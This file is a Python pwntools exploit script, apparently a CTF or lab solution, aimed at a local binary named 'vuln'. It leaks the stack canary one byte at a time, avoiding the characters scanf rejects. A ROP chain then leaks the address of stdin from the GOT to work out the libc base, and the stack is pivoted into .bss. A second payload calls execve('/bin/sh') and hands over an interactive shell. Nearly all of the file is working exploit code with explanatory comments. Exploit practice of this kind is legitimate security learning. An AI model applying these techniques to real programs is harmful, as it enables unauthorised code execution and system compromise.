""" Exploit scenario:
- bypass canary and find canary value
- read stdin_got with write (fd=stdout) in payload1
- read from input and write to .bss location 
  (new rop chain after pivot here) in payload1
- pivot to bss location in payload1
- calculate bin_sh loaded with libc_base
- now send payload2 with ropchain to execve /bin/sh
"""
from pwn import *

r = process('./vuln')
libc = ELF('./libc-2.28.so')
binary = ELF('./vuln')

# Scanf blacklist characters, should not be in any part of payload
scanf_blacklist = ['09', '0a', '0b', '0c', '0d', '20']

# x = raw_input('attach to gdb, then press enter....')


def get_canary_bit(num):
	r.recvuntil('get?\n')
	r.sendline(str(num))
	res = r.recvline()
	value = int(res.split('=')[1].strip())
	return value


# for Canary, First (with least value) byte is null \x00
# we should calculate other 7 bytes of canary value one by one. 
canary = '00'			
for i in range(1, 8):
	value = get_canary_bit(i)
	if hex(value)[2:] in scanf_blacklist:
		# If any other blacklist values in canary byte, then exit, we cant do anythigng with it
		# because scanf will ignore it and not pass that canary value. so smash stack will be detected
		print('illegal character for scanf found {}'.format(hex(value)[2:]))
		exit()
	canary = hex(value)[2:] + canary

canary = '0x' + canary
canary_int = int(canary, 16)

r.recv()

""" Useful Gadgets here
0x0000000000400f8f : syscall
0x0000000000400f63 : pop rdi ; ret
0x0000000000400f61 : pop rsi ; pop r15 ; ret
0x0000000000400f8c : pop rax ; pop rdi ; ret
0x0000000000400f88 : mov rdx, rsi ; ret
0x0000000000400288 : ret
0x0000000000400f5d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400288 : ret
"""
syscall = p64(0x0000000000400f8f)
pop_rax_rdi = p64(0x0000000000400f8c)
pop_rdi = p64(0x0000000000400f63)
pop_rsi_r15 = p64(0x0000000000400f61)
mov_rsi_in_rdx = p64(0x0000000000400f88)
ret = p64(0x0000000000400288)
pop_rsp___ = p64(0x0000000000400f5d)

"""
Payload 1:
find libc location
print location of scanf in .got section, then find scanf location in libc,
then calculate libs_base addr and do the rest.
"""
# Some got locations, We can't use none of them, 
# because of 20 character that is invalid for scanf
# 	scanf_got = p64(binary.got['scanf'])		# 0x5020600000000000
# 	scanf = p64(binary.symbols['scanf'])		# 0xb009400000000000
# 	printf_got = p64(binary.got['printf'])		# 0x1820600000000000

# Instead we will use stdin_got which is found in gdb with x/32xg ...
# we found a location after .got that holds a address which is in libc area
# stdin and stdout
stdin_got = p64(binary.got['stdin'])

payload1 = 'a' * 1032 + p64(canary_int) + 'b' * 8
# payload1 += pop_rdi + stdin_got + printf + 'g' * 8
payload1 += pop_rax_rdi + p64(1) + p64(1) 
payload1 += pop_rsi_r15 + p64(8) + p64(0) + mov_rsi_in_rdx 
payload1 += pop_rsi_r15 + stdin_got + p64(0)
payload1 += syscall

# Now read from input again
payload1 += pop_rax_rdi + p64(0) + p64(0)			# set rax=0 rdi=0
payload1 += pop_rsi_r15 + p64(128) + p64(0) + mov_rsi_in_rdx 

# .bss location to write to: 0x00000000006021EE
bss_adr = p64(0x00000000006021EE)
payload1 += pop_rsi_r15 + bss_adr + p64(0)	# set rsi=.bss location
payload1 += syscall

# Now pivot here
payload1 += pop_rsp___ + bss_adr

r.sendline(payload1)

r.recv()

# Now calculating the libc_base address to find real address for /bin/sh
stdin_leaked = u64(r.recv(6).ljust(8, '\x00'))
print('leaked stdin:\t{}'.format(hex(stdin_leaked)))


"""
for i in libc.symbols:
	if 'stdin' in i:
		print(i)
_IO_2_1_stdin_
stdin
_IO_stdin
got._IO_2_1_stdin_
got.stdin
"""
stdin_libc = libc.symbols['_IO_2_1_stdin_']
print('offset stdin:\t{}'.format(hex(stdin_libc)))

libc_base = stdin_leaked - stdin_libc
print('libc base:\t\t{}'.format(hex(libc_base)))

# /bin/sh real address here
libc.address = libc_base
binsh = libc.search('/bin/sh').next()
print('/bin/sh:\t\t{}'.format(hex(binsh)))

# Because after pivot, from pop_rsp___ program is still reading 3 left pop gadgets,
# we should provide 3 empty ones to pass them.
payload2 = p64(0) * 3
payload2 += pop_rax_rdi + p64(0x3b) + p64(binsh)
payload2 += pop_rsi_r15 + p64(0) + p64(0)
payload2 += pop_rsi_r15 + p64(0) + p64(0) + mov_rsi_in_rdx 
payload2 += syscall
payload2 += '\x90' * (128 - len(payload2))

r.sendline(payload2)

r.interactive()
